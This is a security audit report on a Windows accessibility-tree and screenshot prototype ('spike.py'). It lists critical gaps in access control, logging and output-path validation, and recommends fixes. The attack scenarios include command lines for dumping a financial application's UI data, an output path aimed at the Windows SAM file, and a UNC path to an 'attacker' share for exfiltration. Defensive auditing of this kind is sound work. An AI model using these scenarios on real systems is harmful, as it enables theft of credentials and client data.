# SECURITY ADVERSARIAL REVIEW
## Hermes Eats World — Phase 0 Perception Spike (`spike.py`)
**Review date:** 2026-06-26
**Reviewer:** Adversarial security audit
**Severity scale:** CRITICAL / HIGH / MEDIUM / LOW / INFO

---

## EXECUTIVE SUMMARY

This tool has **zero security controls**. It is a raw data exfiltration engine disguised as a "perception spike." The code can attach to ANY running Windows process, walk its entire UI accessibility tree, extract all text values (including passwords, SSNs, financial data), capture screenshots, and dump everything to unencrypted JSON or PNG files with no access control, no audit trail, no scoping, and no confirmation gates.

**Net finding: 7 CRITICAL, 6 HIGH, 4 MEDIUM, 2 LOW issues. This tool must NOT be run in any environment where it can access production data.**

---

## FINDINGS

### [CRITICAL-1] Unrestricted data exfiltration from ANY process
**Line:** 246-272 (`find_window`), 147-194 (`element_to_dict`)

The `find_window` function accepts a title string with **partial matching** (`Name=title` with `Exists(0, 2)`), meaning `--target "SAGE"` or even `--target "S"` matches any window containing that substring. There is no allowlist, no ownership check, no session token. Any user who runs this script can attach to every visible window on the desktop and extract the complete UI tree including all text content.

**Attack scenario:** An attacker with a brief terminal session runs `python spike.py --list` to enumerate windows, then `python spike.py --target "SAGE" --full --output /tmp/stolen.json` to dump the entire SAGE 50 accessibility tree — including all visible customer names, balances, account numbers, SSNs, and transaction details — into a JSON file.

**Impact:** Complete client data exfiltration from the application layer. The accessibility tree contains ALL text rendered in the UI.

### [CRITICAL-2] Raw value extraction exposes credentials and PII
**Lines:** 40-49, 172 (`get_control_patterns` + `element_to_dict`)

```python
"value": str(value.Value)[:500],
```
```python
"name": (element.Name or "")[:200],
```

The `GetValuePattern` extracts the **full text content** of every value control. This includes:
- Password fields (many applications expose the raw password in their accessibility tree despite showing `••••`)
- Bank account numbers in text inputs
- Social Security numbers
- Credit card numbers
- Customer PII in form fields
- Email content in Outlook/email clients

The 500-character truncation on values is cosmetic — it's enough for full passwords, account numbers, and short PII fields. The 200-character truncation on element names captures full file paths, user names, and document titles.

**Attack scenario:** Target Chrome/Firefox showing a banking portal. Walk the tree. Every filled-in form field is extracted verbatim via `GetValuePattern`.

### [CRITICAL-3] Screenshot capture with no encryption, no access control
**Lines:** 312-349 (`capture_frame`)

```python
output_path = f"c:/Users/OnyxB/hermes-eats-world/spikes/001-perception-spike/hermes_spike_{timestamp}.png"
img.save(output_path)
```

Screenshots are saved as **unencrypted PNG files** to a user-writable directory with default Windows file permissions. Anyone with read access to the filesystem (including backup services, other users on a multi-user system, or a compromised process) can read them. The screenshots capture the full visual content of the target window, which includes everything a human would see.

There is NO:
- Encryption at rest
- Access control on the output directory
- Automatic deletion or rotation
- Content scanning for PII before saving
- Warning that sensitive data is being captured

### [CRITICAL-4] `--list` exposes complete process inventory
**Lines:** 275-309 (`list_windows`), 381-398

```python
windows.append({
    "name": child.Name or "(untitled)",
    "class_name": child.ClassName or "",
    "process_id": child.ProcessId,
    ...
})
```

The `--list` command reveals every top-level window including name, class, and PID. This is a reconnaissance primitive:
- Reveals what applications are running (SAGE, banking apps, admin tools)
- Exposes process IDs for further targeting
- Window names often contain filenames, user names, or document content ("Invoice - ACME Corp - 2026.xlsx")
- Class names reveal application identities (e.g., `Sage50.MainForm`)

### [CRITICAL-5] JSON output dumps ALL extracted data with no sanitization
**Lines:** 455-492

```python
output = {
    "timestamp": datetime.now().isoformat(),
    "target": { "name": ..., "process_id": ..., ... },
    "tier": tier,
    "summary": summary,
    "tree": tree,
}
json_str = json.dumps(output, indent=2, default=str)
if args.output:
    with open(args.output, 'w', encoding='utf-8') as f:
        f.write(json_str)
```

The JSON output contains the **complete** accessibility tree with all extracted values. When `--output` is used, the entire JSON blob is written to a file with:
- No PII detection or redaction
- No encryption
- No access control
- No audit trail

When `--output` is NOT used, the JSON is printed to stdout (line 483-487), which means it's captured in shell history, terminal buffers, CI/CD logs, or any other logging infrastructure that captures stdout.

### [CRITICAL-6] Path traversal in `--output` argument
**Lines:** 475-478

```python
if args.output:
    with open(args.output, 'w', encoding='utf-8') as f:
        f.write(json_str)
```

The `--output` path is used directly with no validation:
- `--output ../../../../Windows/System32/config/SAM` (if running elevated)
- `--output \\\\attacker\\share\\stolen.json` (UNC path exfiltration)
- `--output /dev/null` or other special devices on Linux WSL
- Overwrites arbitrary files — `--output C:/Windows/system.ini` would inject JSON into system.ini

### [CRITICAL-7] No OathLedger audit logging
**Lines:** Entire file

The spec explicitly states OathLedger logging is "non-negotiable for MVP." This spike has:
- Zero audit logging
- No record of what was accessed, when, by whom
- No tamper-evident log of operations
- No way to reconstruct what data was exfiltrated after the fact

This makes the tool completely untraceable. In a security investigation, there would be no record that this tool ran, what it accessed, or what data it extracted.

---

### [HIGH-1] No access control / privilege model
**Lines:** Entire file

There is no concept of:
- Authentication to run the tool
- Authorization to target specific windows
- Role-based access control
- Principle of least privilege

The tool runs as the current user and can access ANY window that the current Windows user session can see. This includes admin-elevated windows in many configurations (UIPI bypasses).

### [HIGH-2] Default `max_depth=999` with `--full` flag
**Lines:** 419

```python
max_depth = 999 if args.full else args.depth
```

With `--full`, the tool walks the entire accessibility tree to depth 999. For a complex application like SAGE 50 or a web browser with multiple tabs, this can be millions of UI elements containing massive amounts of data. There is no rate limiting, no quota, and no warning about data volume.

### [HIGH-3] Stdout exposure of sensitive data
**Lines:** 483-487

```python
if len(json_str) > 80000:
    print(json_str[:80000])
else:
    print(json_str)
```

When `--output` is not specified, the complete JSON tree (up to 80,000 characters) is printed to stdout. This means:
- Terminal buffers contain PII
- Shell history may capture command-line arguments containing window names with sensitive data
- Any process monitoring or log aggregation system captures the data
- The 80,000 character truncation is insufficient — passwords, SSNs, and account numbers are much shorter than this

### [HIGH-4] Hardcoded output path is user-writable
**Lines:** 336-337

```python
output_path = f"c:/Users/OnyxB/hermes-eats-world/spikes/001-perception-spike/hermes_spike_{timestamp}.png"
```

The default screenshot path is hardcoded to a user-writable directory. This means:
- Predictable filename (timestamp-based) allows race conditions
- Any process can read these files
- No `.gitignore` check — if this directory is under version control, screenshots could be committed
- The path uses forward slashes on a Windows system, suggesting inconsistent path handling

### [HIGH-5] Process ID enumeration enables targeted attacks
**Lines:** 296, 413, 458

```python
"process_id": child.ProcessId,
"process_id": target.ProcessId,
```

The tool exposes PIDs, which can be used to:
- Identify and target specific processes for injection attacks
- Map process trees to understand privilege levels
- Correlate with Windows security events
- Target admin-elevated processes specifically

### [HIGH-6] No confirmation gates for destructive operations
**Lines:** 451-453

```python
if args.screenshot:
    print(f"\nCapturing frame...")
    capture_frame(target)
```

There is no confirmation prompt before capturing screenshots or writing files. The tool silently captures and saves. For a tool that can capture sensitive data, there should be:
- A confirmation prompt
- A warning about potential PII capture
- An option for dry-run mode
- A "sensitive data detected" warning

---

### [MEDIUM-1] Broad exception swallowing hides access errors
**Lines:** 33-143, 182-192, 249-270

```python
except Exception:
    pass
```

Every control pattern extraction silently catches all exceptions. This means:
- Access denied errors (UIPI violations) are silently ignored — the operator has no feedback
- Crashes in the target application's COM server are hidden
- The tool continues operating without the user knowing that data may be incomplete
- No logging means no audit trail of what failed

### [MEDIUM-2] UIPI bypass potential
**Lines:** 246-272

Windows User Interface Privilege Isolation (UIPI) prevents lower-privilege processes from injecting input into or fully accessing higher-privilege windows. However, the `uiautomation` library uses UI Automation COM interfaces which can sometimes bypass UIPI through accessibility features. If this tool is run elevated (even briefly), it could access admin windows and extract their contents.

### [MEDIUM-3] Partial match targeting enables accidental or deliberate mis-targeting
**Lines:** 248-254

```python
win = auto.WindowControl(SearchDepth=1, Name=title)
```

The title match uses `Name=title` which performs a **substring match**, not an exact match. `--target "Invoice"` matches "Invoice - ACME Corp", "Invoice Archive", "Invoice Template - CONFIDENTIAL", etc. An operator targeting a test invoice could accidentally access a production invoice.

### [MEDIUM-4] `--class` argument allows targeting by window class
**Lines:** 256-262, 372

```python
parser.add_argument("--class", type=str, dest="class_name", ...)
win = auto.WindowControl(SearchDepth=1, ClassName=class_name)
```

Targeting by window class name allows targeting ALL instances of an application class, not just a specific window. `--class "Sage50.MainForm"` could match multiple SAGE windows. Combined with `--full`, this could dump multiple financial databases simultaneously.

---

### [LOW-1] Screenshot import inside function is inefficient and error-prone
**Lines:** 340

```python
from PIL import Image as PilImage
```

The PIL import is inside the function body, meaning:
- First call is slow (import overhead)
- Import errors only surface at screenshot time, not at startup
- Duplicate imports on each call if `output_path` is None (line 335 also has a duplicate `from datetime import datetime`)

### [LOW-2] Duplicate datetime import
**Lines:** 22, 335

```python
from datetime import datetime  # line 22
from datetime import datetime  # line 335, inside capture_frame
```

The datetime module is imported both at module level and inside `capture_frame`. This is redundant but not a security issue.

---

## SPEC REQUIREMENTS vs IMPLEMENTATION GAPS

| Spec Requirement | Status | Notes |
|---|---|---|
| OathLedger logging | **MISSING** | Zero audit logging implemented |
| Guardrails | **MISSING** | No allowlists, no access control, no confirmation gates |
| Scope restriction | **MISSING** | Tool can access ANY window, not just "handed" ones |
| Credential handling | **NOT ADDRESSED** | No credential storage, no secret management, no redaction |
| Data classification | **NOT ADDRESSED** | No PII detection, no sensitivity labeling |
| Encryption at rest | **NOT ADDRESSED** | JSON and PNG files stored unencrypted |
| Access control | **NOT ADDRESSED** | No authentication, no authorization, no RBAC |
| Audit trail | **NOT ADDRESSED** | No logging of operations, targets, or data access |

---

## ATTACK SURFACE SUMMARY

```
ATTACK VECTORS:
├── Direct exfiltration
│   ├── python spike.py --list                    → Reconnaissance
│   ├── python spike.py --target "SAGE" --full    → Full tree dump
│   ├── python spike.py --target "Chrome" --full  → Browser content dump
│   └── python spike.py --screenshot              → Visual capture
│
├── Data persistence
│   ├── JSON files (unencrypted, no access control)
│   ├── PNG screenshots (unencrypted, predictable paths)
│   └── stdout output (captured in logs, buffers)
│
├── File system attacks
│   ├── Path traversal via --output
│   ├── UNC path exfiltration
│   └── Arbitrary file overwrite
│
└── Process attacks
    ├── PID enumeration → targeted attacks
    ├── UIPI bypass potential
    └── No privilege separation
```

---

## RECOMMENDATIONS (Priority Order)

1. **BLOCK**: Do NOT run this tool against any system containing production data until guardrails are implemented
2. **ADD**: OathLedger audit logging for every operation (non-negotiable per spec)
3. **ADD**: Window allowlist — only permit targeting explicitly approved windows
4. **ADD**: PII detection and redaction before writing any output
5. **ADD**: Encryption at rest for all output files (JSON and screenshots)
6. **ADD**: Access control — authentication and authorization before any operation
7. **ADD**: Confirmation gates before screenshot capture and file writes
8. **FIX**: Validate and sanitize `--output` path (no traversal, no UNC paths)
9. **FIX**: Exact-match window targeting, not substring matching
10. **ADD**: Maximum data volume limits with explicit operator confirmation
11. **ADD**: Automatic cleanup of output files after use
12. **ADD**: Structured error logging instead of silent exception swallowing

---

## BOTTOM LINE

This is not a "spike" — it's an uncontrolled data extraction tool. The spec acknowledges that "this tool can drive real applications holding real client financial data" and that "guardrails are part of the MVP." The current code has **zero guardrails**. Running this against any system with client data constitutes a data breach risk.
